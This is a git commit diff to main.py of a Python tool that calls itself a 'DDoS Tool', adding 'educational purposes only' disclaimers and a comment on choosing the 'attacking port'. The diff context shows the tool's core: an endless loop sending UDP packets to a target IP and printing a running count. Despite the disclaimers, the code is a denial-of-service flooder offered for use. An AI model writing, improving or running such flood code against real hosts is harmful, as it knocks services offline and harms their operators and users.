47c7915f817e940cf62a4dbabe0d08c55f425949
copy & execute <145934673+copy-and-execute@users.noreply.github.com>
2023-09-28 07:32:59 +0200

    main.py update
    + added comments

--- main.py
+++ main.py
@@ -1,3 +1,4 @@
+# THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY
 import os
 import time
 import socket
@@ -6,7 +7,8 @@ import random
 print()
 print('    | DDoS Tool by → copy-and-execute (github.com/copy-and-execute/)')
 print('    | → This tool is only for educational purposes. Do not use this for illegal purposes.')
-print()
+print('    | → You are responsible for all actions you perform with this code/tool.')
+
 mydate = time.strftime('%Y-%m-%d')
 mytime = time.strftime('%H-%M')
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -19,7 +21,7 @@ sent = 0
 while True:
     sock.sendto(bytes, (ip, 1))
     sent = sent + 1
-    port = 80
+    port = 80 # You can edit your attacking port here
     print("    | Sent Packet → %s through %s:%s" % (sent, ip, port))
     if port == 65534:
         port = 1
